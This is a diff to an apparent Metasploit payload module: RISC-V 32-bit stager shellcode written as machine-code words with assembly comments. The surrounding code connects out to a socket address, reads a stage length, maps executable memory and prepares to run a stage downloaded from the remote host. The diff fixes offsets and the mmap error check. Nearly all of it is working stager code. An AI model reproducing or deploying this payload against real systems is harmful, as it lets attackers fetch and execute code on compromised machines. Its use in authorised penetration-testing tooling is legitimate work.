@@ -58,10 +58,9 @@ module MetasploitModule
       0xf0010113,          # addi  sp, sp, -256      # allocate stack
       0x00012023,          # sw    zero, 0(sp)       # clear sin_family+sin_port
       0x00012223,          # sw    zero, 4(sp)       # clear sin_addr
-      0x00012423,          # sw    zero, 8(sp)       # clear sin_zero
-      0x00012623,          # sw    zero, 12(sp)      # clear sin_zero
+      0x00012423,          # sw    zero, 8(sp)       # clear sin_zero (Linux ignores sin_zero for TCP)
       0x00000297,          # auipc t0, 0             # t0 = PC
-      0x0cc28293,          # addi  t0, t0, 204       # t0 = &sockaddr (end of payload)
+      0x0D028293,          # addi  t0, t0, 208       # t0 = &sockaddr (end of payload)
       0x0002a303,          # lw    t1, 0(t0)         # load family+port word
       0x00612023,          # sw    t1, 0(sp)         # store family+port at sp
       0x00010593,          # mv    a1, sp            # a1 = &sockaddr on stack
@@ -90,7 +89,7 @@ module MetasploitModule
 
       # validate read returned exactly 4 bytes
       0x00400313,          # li    t1, 4
-      0x06651463,          # bne   a0, t1, fail
+      0x06651663,          # bne   a0, t1, fail
 
       # mmap(NULL, aligned_length, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
       0x00012e03,          # lw    t3, 0(sp)         # t3 = stage length
@@ -105,8 +104,11 @@ module MetasploitModule
       0x0de00893,          # li    a7, 222           # SYS_mmap
       0x00000073,          # ecall
 
-      # validate mmap succeeded
-      0x02054c63,          # bltz  a0, fail
+      # validate mmap succeeded — unsigned check required because user-space addresses
+      # on riscv32le may have bit 31 set (above 0x80000000); bltz would misfire on them.
+      # Linux mmap errors are always in [0xFFFFF001, 0xFFFFFFFF]; valid addresses are not.
+      0xFFFFF337,          # lui   t1, 0xFFFFF        # t1 = 0xFFFFF000
+      0x02A36C63,          # bltu  t1, a0, fail       # branch if a0 > 0xFFFFF000 (error range)
 
       0x000e0e93,          # mv    t4, t3            # t4 = remaining bytes
       0x00050f13,          # mv    t5, a0            # t5 = mmap base (exec target)
